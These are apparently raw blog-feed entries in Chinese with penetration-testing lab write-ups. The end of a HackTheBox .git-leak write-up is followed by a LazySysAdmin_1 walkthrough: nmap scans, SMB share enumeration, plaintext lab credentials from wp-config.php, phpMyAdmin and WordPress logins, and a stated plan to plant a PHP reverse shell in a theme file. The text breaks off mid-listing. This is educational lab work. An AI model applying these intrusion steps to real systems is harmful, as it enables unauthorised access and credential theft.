qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:b9:e8:f2 brd ff:ff:ff:ff:ff:ff<br>    altname enp3s0<br>    altname ens160<br>    inet 10.10.11.219/23 brd 10.10.11.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><h2 id="总结复盘"><a href="#总结复盘" class="headerlink" title="总结复盘"></a>总结复盘</h2><p>这台靶机攻击路径给的很好，并没有直接简单粗暴地使用漏洞脚本去 getshell，而是把场景藏在了 <code>.git</code> 泄露中，并且把 Web 提供服务的程序放入了其中，从程序判断出任意文件读取，再加上通过泄露的 <code>login.php</code> 文件中提到了连接的数据库文件，自然而然地梳理出读取数据库文件的思路，提权的场景也做得比较用心，把提权思路藏在了正在运行的进程中。总得来说，是一台很锻炼渗透思路和搜索排查能力的靶机，很值得打一打。</p><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p>HTB 靶机更新频繁，可以从中学习到许多新的知识，过去打完靶机关于总结复盘和知识补充可能草草了之，对靶机并没有吃透，所以新增加了总结复盘和知识补充这两个部分，希望自己可以学得更加深入。</p><h3 id="git-泄露-1"><a href="#git-泄露-1" class="headerlink" title=".git 泄露"></a>.git 泄露</h3><p>.git 泄露有两种情景，一种是启用了目录索引，另一种是禁止了目录索引。对于这两种情况，也需要使用不同的工具进行操作</p><p>工具</p><p><a href="https://github.com/WangYihang/GitHacker">WangYihang&#x2F;GitHacker：🕷️一个“.git”文件夹利用工具，能够恢复整个Git存储库，包括存储，公共分支，公共标签。 (github.com)</a></p><p><a href="https://github.com/lijiejie/GitHack">lijiejie&#x2F;GitHack: A <code>.git</code> folder disclosure exploit (github.com)</a> </p><p><a href="https://github.com/internetwache/GitTools">internetwache&#x2F;GitTools: A repository with 3 tools for pwn’ing websites with .git repositories available (github.com)</a></p><p>从结果上看，GitHacker 能够获得更加完善的信息，但感觉动静应该也不小，按需取用吧</p><p>将 git 文件夹下载下来后，我们需要可用切换到其目录下，尝试使用以下命令来获取信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看日志</span><br>git <span class="hljs-built_in">log</span><br><br><span class="hljs-comment"># 查看提交的区别</span><br>git diff + CommitId<br><br><span class="hljs-comment"># 查看最近的更改</span><br>git status<br><br><span class="hljs-comment"># 恢复上次提交的历史状态</span><br>git checkout -- . or git restore .<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LazySysAdmin_1 靶机</title>
    <link href="/2023/07/ce627963c73e.html"/>
    <url>/2023/07/ce627963c73e.html</url>
    
    <content type="html"><![CDATA[<h1 id="LazySysAdmin-1-靶机"><a href="#LazySysAdmin-1-靶机" class="headerlink" title="LazySysAdmin_1 靶机"></a>LazySysAdmin_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.130   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-07 08:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.130<br>Host is up (0.0028s latency).<br>Not shown: 65529 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>3306/tcp open  mysql<br>6667/tcp open  irc<br>MAC Address: 00:0C:29:96:E4:E9 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.03 seconds<br></code></pre></td></tr></table></figure><p>开放了 22,80,139,445,3306,6667 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,139,445,3306,6667 192.1.1.130<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-07 08:43 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.130<br>Host is up (0.00043s latency).<br><br>PORT     STATE SERVICE     VERSION<br>22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 b5:38:66:0f:a1:ee:<span class="hljs-built_in">cd</span>:41:69:3b:82:cf:ad:a1:f7:13 (DSA)<br>|   2048 58:5a:63:69:d0:da:<span class="hljs-built_in">dd</span>:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)<br>|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)<br>|_  256 1f:65:c0:<span class="hljs-built_in">dd</span>:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-generator: Silex v2.2.7<br>| http-robots.txt: 4 disallowed entries <br>|_/old/ /test/ /TR2/ /Backnode_files/<br>|_http-title: Backnode<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open              Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>3306/tcp open  mysql       MySQL (unauthorized)<br>6667/tcp open  irc         InspIRCd<br>| irc-info: <br>|   server: Admin.<span class="hljs-built_in">local</span><br>|   <span class="hljs-built_in">users</span>: 1<br>|   servers: 1<br>|   chans: 0<br>|   lusers: 1<br>|   lservers: 0<br>|   <span class="hljs-built_in">source</span> ident: nmap<br>|   <span class="hljs-built_in">source</span> host: 192.1.1.128<br>|_  error: Closing <span class="hljs-built_in">link</span>: (nmap@192.1.1.128) [Client exited]<br>MAC Address: 00:0C:29:96:E4:E9 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Hosts: LAZYSYSADMIN, Admin.<span class="hljs-built_in">local</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-07T12:43:23<br>|_  start_date: N/A<br>|_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: 0s<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: lazysysadmin<br>|   NetBIOS computer name: LAZYSYSADMIN\x00<br>|   Domain name: \x00<br>|   FQDN: lazysysadmin<br>|_  System time: 2023-07-07T22:43:23+10:00<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 30.13 seconds<br></code></pre></td></tr></table></figure><p>梳理一下信息：Ubuntu 系统，80 端口使用的是 Silex v2.2.7 搭配 apache 搭建的，存在文件 <code>robots.txt</code>，存在目录 <code>/old/ /test/ /TR2/ /Backnode_files/</code>，标题是 Backnode，139 和 445 端口运行着 Samba 并且有一般用户的权限，3306 运行着 MySQL，6667 端口运行着 irc 服务，这个不清楚是什么等会查查资料</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ sudo nmap --script=vuln -p22,80,139,445,3306,6667 192.1.1.130 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-07 09:00 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.130<br>Host is up (0.00031s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>| http-enum: <br>|   /wordpress/: Blog<br>|   /test/: Test page<br>|   /robots.txt: Robots file<br>|   /info.php: Possible information file<br>|   /phpmyadmin/: phpMyAdmin<br>|   /wordpress/wp-login.php: Wordpress login page.<br>|   /apache/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span><br>|_  /old/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span><br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-sql-injection: </span><br><span class="hljs-string">|   Possible sqli for queries:</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.1.1.130:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|_    http://192.1.1.130:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>3306/tcp open  mysql<br>6667/tcp open  irc<br>|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait <span class="hljs-built_in">set</span> to 100 (or higher <span class="hljs-keyword">if</span> you get this message again).<br>| irc-botnet-channels: <br>|_  ERROR: TIMEOUT<br>MAC Address: 00:0C:29:96:E4:E9 (VMware)<br><br>Host script results:<br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc <span class="hljs-keyword">in</span> Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc <span class="hljs-keyword">in</span> Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service <span class="hljs-keyword">if</span> it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       <span class="hljs-keyword">while</span> working on smb-enum-sessions.<br>|_          <br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 328.29 seconds<br></code></pre></td></tr></table></figure><p>多了一些信息：扫出来了 <code>wordpress</code>, <code>test</code>, <code>info.php</code>, <code>phpmyadmin</code>, <code>wordpress/wp-login.php</code>, <code>apache</code>, <code>old</code> 目录和文件，接下来先从 smb 入手吧</p><h2 id="smb-渗透"><a href="#smb-渗透" class="headerlink" title="smb 渗透"></a>smb 渗透</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo smbmap -H 192.1.1.130        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>[+] Guest session       IP: 192.1.1.130:445     Name: 192.1.1.130                                       <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        share$                                                  READ ONLY       Sumshare<br>        IPC$                                                    NO ACCESS       IPC Service (Web server)<br></code></pre></td></tr></table></figure><p>得到了一个特殊目录 <code>share$</code>，尝试 smbclient 来连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.1.1.130/share$    <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Tue Aug 15 07:05:52 2017<br>  ..                                  D        0  Mon Aug 14 08:34:47 2017<br>  wordpress                           D        0  Tue Aug 15 07:21:08 2017<br>  Backnode_files                      D        0  Mon Aug 14 08:08:26 2017<br>  wp                                  D        0  Tue Aug 15 06:51:23 2017<br>  deets.txt                           N      139  Mon Aug 14 08:20:05 2017<br>  robots.txt                          N       92  Mon Aug 14 08:36:14 2017<br>  todolist.txt                        N       79  Mon Aug 14 08:39:56 2017<br>  apache                              D        0  Mon Aug 14 08:35:19 2017<br>  index.html                          N    36072  Sun Aug  6 01:02:15 2017<br>  info.php                            N       20  Tue Aug 15 06:55:19 2017<br>  <span class="hljs-built_in">test</span>                                D        0  Mon Aug 14 08:35:10 2017<br>  old                                 D        0  Mon Aug 14 08:35:13 2017<br><br>                3029776 blocks of size 1024. 1456476 blocks available<br>smb: \&gt;<br></code></pre></td></tr></table></figure><p>竟然有那么多东西，根据 robots.txt 大概判断出这是网站根目录被共享了出来。首先把几个 txt 下载到本地查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">cat</span> deets.txt                           <br>CBF Remembering all these passwords.<br><br>Remember to remove this file and update your password after we push out the server.<br><br>Password 12345<br><br>┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">cat</span> todolist.txt <br>Prevent <span class="hljs-built_in">users</span> from being able to view to web root using the <span class="hljs-built_in">local</span> file browser<br><br>┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">cat</span> robots.txt <br>User-agent: *<br>Disallow: /old/<br>Disallow: /test/<br>Disallow: /TR2/<br>Disallow: /Backnode_files/<br><br></code></pre></td></tr></table></figure><p>得到了一个重要信息也就是密码 <code>12345</code>，目前还不知道到底是谁的密码，暂时记录下来，继续查看 smb 中的文件，进入各个文件夹查看，发现最值得关注的还是 <code>wp-config.php</code> 文件，将其下载到本地看看有没有数据库连接密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">head</span> -n 30 wp-config.php<br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpress<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>Admin<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>TogieMYSQL12345^^<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>得到了 <code>Admin:TogieMYSQL12345^^</code> 这样一对用户名和密码，记得之前 nmap 扫描的结果中有 phpmyadmin，尝试用上述凭据登录</p><h2 id="phpmyadmin-登录"><a href="#phpmyadmin-登录" class="headerlink" title="phpmyadmin 登录"></a>phpmyadmin 登录</h2><p>登录成功，不过报了很多错误，似乎是配置有点问题，不过无伤大雅，可视化界面有问题，那就直接使用 SQL 语句。在使用 SQL 语句查询的时候，一开始想直接把整个表信息显示出来：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> wp<span class="hljs-operator">-</span>users;<br></code></pre></td></tr></table></figure><p>但是遇到了报错，于是尝试选定字段</p><p><img src="/pic/7c671371f20db023a1f7d86475fba849_MD5.png"></p><p>虽然密码是哈希存储的，但是 wordpress 登录的用户名和数据库的用户名是相同的，因此可以尝试用同一个密码登录试试</p><h2 id="Wordpress-登录"><a href="#Wordpress-登录" class="headerlink" title="Wordpress 登录"></a>Wordpress 登录</h2><p>登录成功</p><p><img src="/pic/568a6b02c5561718523f1e44276de3f7_MD5.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>那就直接去主题编辑器中修改 404.php 文件吧</p><p><img src="/pic/5505a9e5d26e3d128cfc74a17000298e_MD5.png"></p><p>可以点击 <code> Update File</code> 按钮，那就在这里写入经典的 php 反向 shell，接下来要找访问链接，原本想偷懒，修改文章的链接来重定向到 404.php，但是似乎网站在这方面没配置，那就只能找真正的 404.php 的完整路径，借助于 wpscan 来找主题的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 